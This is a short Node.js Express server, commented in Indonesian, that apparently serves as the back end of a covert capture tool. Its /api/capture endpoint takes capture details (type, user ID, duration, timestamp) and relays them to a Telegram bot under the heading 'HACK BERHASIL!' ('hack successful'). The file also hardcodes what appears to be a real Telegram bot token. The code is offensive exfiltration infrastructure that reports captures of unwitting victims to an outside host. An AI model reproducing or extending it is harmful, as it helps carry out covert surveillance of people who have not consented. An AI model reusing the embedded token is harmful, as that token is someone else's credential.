const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

const botToken = '8447717789:AAEHoP_IgrjY2acXXom4uDqWWv4yeptVZvY';
const botUrl = `https://api.telegram.org/bot${botToken}`;

app.post('/api/capture', async (req, res) => {
    const { type, userId, duration, timestamp } = req.body;
    
    // Kirim ke bot telegram
    let message = `✅ HACK BERHASIL!\n`;
    message += `Type: ${type}\n`;
    message += `User ID: ${userId}\n`;
    message += `Duration: ${duration}s\n`;
    message += `Time: ${new Date(timestamp).toLocaleString()}`;
    
    try {
        await axios.post(`${botUrl}/sendMessage`, {
            chat_id: userId,
            text: message,
            parse_mode: 'HTML'
        });
        
        res.json({ status: 'ok' });
    } catch (error) {
        console.error('Error sending to bot:', error);
        res.json({ status: 'error' });
    }
});

app.listen(3000, () => {
    console.log('Capture API running on port 3000');
});